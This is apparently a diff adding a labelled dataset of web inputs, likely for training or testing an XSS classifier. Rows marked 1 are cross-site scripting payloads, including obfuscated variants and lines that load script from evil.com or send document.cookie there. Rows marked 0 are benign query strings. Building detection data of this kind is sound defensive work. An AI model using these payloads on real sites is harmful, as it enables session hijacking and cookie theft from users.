+<SCRIPT>alert('XSS')</SCRIPT>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(document.cookie)>,1
+<input onfocus=alert(1) autofocus>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<svg/onload=alert(1)>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<svg/onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<a href='javascript:alert(1)'>click</a>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<iframe src='javascript:alert(1)'>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<details ontoggle=alert(1) open>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+<iframe src='javascript:alert(1)'>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<input onfocus=alert(1) autofocus>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<input onfocus=alert(1) autofocus>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<iframe src='javascript:alert(1)'>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(document.cookie)>,1
+<input onfocus=alert(1) autofocus>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+<body onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<iframe src='javascript:alert(1)'>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(1)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<input onfocus=alert(1) autofocus>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(document.cookie)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+theme=dark,0
+lang=fa,0
+products id=42&category=electronics id=42 category=electronics,0
+search=running+shoes&category=sports&sort=price&order=asc,0
+=b,0
+query=python+programming,0
+ref=homepage,0
+name=John+Smith,0
+page=1,0
+keyword=machine+learning,0
+sort=date&order=desc,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+view=grid,0
+view=grid,0
+ref=homepage,0
+category=electronics,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+view=grid,0
+products id=42&category=electronics id=42 category=electronics,0
+email=user@example.com,0
+=b,0
+q=test,0
+ref=homepage,0
+username=ali,0
+product?id=25,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
+products id=42&category=electronics id=42 category=electronics,0
+lang=fa,0
+item=42&qty=3,0
+product?id=25,0
+ref=homepage,0
+page=home,0
+user_id=15,0
+products id=42&category=electronics id=42 category=electronics,0
+email=user@example.com,0
+age=25,0
+filter=price&sort=asc,0
+product?id=25,0
+query=python+programming,0
+search=laptop,0
+user_id=15,0
+sort=date&order=desc,0
+sort=price,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+page=home,0
+page=2,0
+search=laptop,0
+order_id=1234,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+theme=dark,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+x=1,0
+ref=homepage,0
+username=ali,0
+order_id=1234,0
+city=Tehran,0
+sort=date&order=desc,0
+=b,0
+category=clothing,0
+sort=price,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+=b,0
+username=ali,0
+x=1,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+ref=homepage,0
+page=1,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+products id=42&category=electronics id=42 category=electronics,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+age=25,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+user_id=15,0
+theme=dark,0
+ref=homepage,0
+a=b,0
+filter=price&sort=asc,0
+city=Tehran,0
+filter=price&sort=asc,0
+search=laptop,0
+age=25,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+page=home,0
+query=python+programming,0
+limit=10&offset=20,0
+theme=dark,0
+search=laptop,0
+product?id=25,0
+theme=dark,0
+product?id=25,0
+username=ali,0
+search=laptop,0
+search=running+shoes&category=sports&sort=price&order=asc,0
+view=grid,0
+email=user@example.com,0
+age=25,0
+lang=fa,0
+product?id=100,0
+user_id=15,0
+x=1,0
+ref=homepage,0
+=b,0
+filter=price&sort=asc,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+sort=date&order=desc,0
+lang=fa,0
+item=42&qty=3,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
+username=sara123,0
+=b,0
+category=electronics,0
+search=running+shoes&category=sports&sort=price&order=asc,0
+email=user@example.com,0
+username=sara123,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+page=home,0
+filter=price&sort=asc,0
+,0
+order_id=1234,0
+query=python+programming,0
+keyword=machine+learning,0
+page=2,0
+item=42&qty=3,0
+product?id=25,0
+a=b,0
+category=electronics,0
+email=user@example.com,0
+search=book,0
+sort=price,0
+lang=fa,0
+currency=USD,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+products id=42&category=electronics id=42 category=electronics,0
+search=book,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+view=grid,0
+x=1,0
+limit=10&offset=20,0
+q=test,0
+item=42&qty=3,0
+page=2,0
+a=b,0
+limit=10&offset=20,0
+search=book,0
+sort=date&order=desc,0
+search=book,0
+order_id=1234,0
+category=clothing,0
+product?id=100,0
+a=b,0
+theme=dark,0
+products id=42&category=electronics id=42 category=electronics,0
+sort=date&order=desc,0
+email=user@example.com,0
+lang=fa,0
+search=running+shoes&category=sports&sort=price&order=asc,0
+name=John+Smith,0
+filter=price&sort=asc,0
+category=electronics,0
+a=,0
+page=2,0
+keyword=machine+learning,0
+,0
+product?id=100,0
+page=2,0
+currency=USD,0
+ref=homepage,0
+ref=homepage,0
+=b,0
+x=1,0
+name=John+Smith,0
+city=Tehran,0
+item=42&qty=3,0
+page=2,0
+query=python+programming,0
+username=sara123,0
+item=42&qty=3,0
+sort=price,0
+name=John+Smith,0
+product?id=25,0
+currency=USD,0
+a=,0
+user_id=15,0
+q=test,0
+sort=date&order=desc,0
+=b,0
+category=clothing,0
+email=user@example.com,0
+name=John+Smith,0
+sort=price,0
+currency=USD,0
+theme=dark,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+item=42&qty=3,0
+=b,0
+,0
+category=clothing,0
+email=user@example.com,0
+q=test,0
+product?id=25,0
+query=python+programming,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+sort=price,0
+product?id=25,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
+,0
